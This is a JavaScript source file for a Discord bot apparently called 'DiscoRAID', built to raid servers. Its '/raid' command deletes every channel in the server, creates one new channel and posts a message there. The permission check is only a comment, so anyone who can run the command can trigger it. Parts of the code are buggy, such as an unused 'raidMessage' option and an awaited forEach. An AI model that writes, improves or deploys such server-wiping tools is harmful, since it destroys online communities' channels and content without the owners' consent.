const { Client, IntentsBitField } = require('discord.js');

// Load environment variables
require('dotenv').config();

const client = new Client({ 
  intents: [
    IntentsBitField.Flags.Guilds,
    IntentsBitField.Flags.GuildMembers,
    IntentsBitField.Flags.GuildMessages,
    IntentsBitField.Flags.MessageContent,
  ]
});

client.login(process.env.TOKEN);

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}! ✅`);
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'online') {
    interaction.reply('DiscoRAID is online ! ✅');
  }

  if (interaction.commandName === 'raid') {
    // Check if the user has the necessary permissions (e.g., MANAGE_CHANNELS)

    const userMessage = interaction.options.getString('raidMessage');
  
    // Get the guild
    const guild = interaction.guild;

    // Fetch all channels and delete them
    await guild.channels.cache.forEach(channel => channel.delete());

    interaction.reply({ content: 'All channels have been removed.', ephemeral: true });


    try {
      const newChannel = await guild.channels.create('new-channel', {
        
        type: 'GUILD_TEXT',
      });
      
      await newChannel.send('MESSAGE HERE.');
      
    } catch (error) {

        console.log(`an error has occured, ${error}`)
        return;
    }
    
    // Send the user's message in the new channel
  }
});

client.on('messageCreate', (message) => {
  if (message.content === '<@1150483197503741962>') {
    message.reply('Bot is Online ✅');
  }
});
